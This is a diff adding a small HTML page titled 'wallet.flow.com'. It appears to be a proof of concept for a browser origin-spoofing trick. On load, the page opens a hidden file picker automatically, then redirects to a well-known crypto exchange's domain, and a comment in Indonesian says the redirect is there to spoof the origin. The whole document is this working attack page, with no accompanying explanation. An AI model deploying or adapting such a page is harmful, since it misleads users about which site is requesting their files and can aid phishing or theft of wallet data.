@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>wallet.flow.com</title>
+</head>
+<body>
+
+<input type="file" id="fileInput" style="display:none;" />
+
+<script>
+  function triggerFilePicker() {
+    const fileInput = document.getElementById("fileInput");
+    fileInput.click();
+
+    // Navigasi untuk spoof origin
+    setTimeout(() => {
+      location.href = "https://1inch.com/";
+    }, 1000);
+  }
+
+  // Autoload: jalankan otomatis ketika halaman terbuka
+  window.onload = () => {
+    setTimeout(triggerFilePicker, 300); 
+  };
+</script>
+
+</body>
+</html>
